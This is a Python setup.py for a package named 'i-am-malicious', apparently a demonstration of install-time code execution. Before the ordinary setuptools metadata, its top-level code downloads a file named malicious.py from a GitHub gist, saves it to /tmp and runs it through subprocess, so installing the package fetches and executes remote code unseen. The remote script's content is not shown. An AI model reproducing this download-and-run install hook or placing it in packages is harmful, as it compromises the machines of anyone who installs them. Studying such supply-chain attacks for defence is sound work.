from urllib.request import urlopen

handler = urlopen("https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py")
with open("/tmp/malicious.py", "wb") as fp:
    fp.write(handler.read())

import subprocess

subprocess.call(["python", "/tmp/malicious.py"])


import setuptools

setuptools.setup(
    name="i-am-malicious",
    version="1.0.1",
    url="",

    author="Martin Vielsmaier",
    author_email="moser@moserei.de",

    description="",
    long_description="",
    keywords=[],
    packages=setuptools.find_packages(),
    install_requires=['pytest'],
    setup_requires=[],
    tests_require=[],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    entry_points={
    },
)
